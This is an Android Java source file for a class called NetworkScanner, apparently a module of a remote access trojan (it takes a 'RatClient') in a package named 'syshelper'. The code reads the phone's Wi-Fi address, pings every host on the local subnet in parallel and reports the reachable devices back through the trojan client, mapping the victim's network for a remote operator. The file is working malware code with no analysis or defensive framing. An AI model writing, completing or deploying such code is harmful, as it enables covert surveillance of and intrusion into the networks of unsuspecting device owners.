package com.syshelper.service;
import android.content.Context;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.text.format.Formatter;
import org.json.JSONArray;
import org.json.JSONObject;
import java.net.InetAddress;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class NetworkScanner {
    private final Context ctx;
    private final RatClient client;

    public NetworkScanner(Context ctx, RatClient client) { this.ctx = ctx; this.client = client; }

    public void scan() {
        new Thread(() -> {
            JSONObject result = new JSONObject();
            JSONArray devices = new JSONArray();
            String localIp = getLocalIp();
            if (localIp == null) { client.sendResult("network_scan", "Could not determine local IP"); return; }
            String subnet = localIp.substring(0, localIp.lastIndexOf("."));
            client.sendResult("network_scan", "Scanning " + subnet + ".0/24");
            ExecutorService pool = Executors.newFixedThreadPool(20);
            for (int i = 1; i < 255; i++) {
                final String ip = subnet + "." + i;
                pool.submit(() -> {
                    try {
                        if (InetAddress.getByName(ip).isReachable(500)) {
                            JSONObject device = new JSONObject();
                            device.put("ip", ip);
                            devices.put(device);
                        }
                    } catch (Exception ignored) {}
                });
            }
            pool.shutdown();
            try { pool.awaitTermination(30, TimeUnit.SECONDS); } catch (InterruptedException ignored) {}
            try { result.put("subnet", subnet + ".0/24"); result.put("devices", devices); client.sendResult("network_scan", result); } catch (Exception ignored) {}
        }).start();
    }

    private String getLocalIp() {
        try {
            WifiManager wm = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            WifiInfo info = wm.getConnectionInfo();
            return Formatter.formatIpAddress(info.getIpAddress());
        } catch (Exception e) { return null; }
    }
}
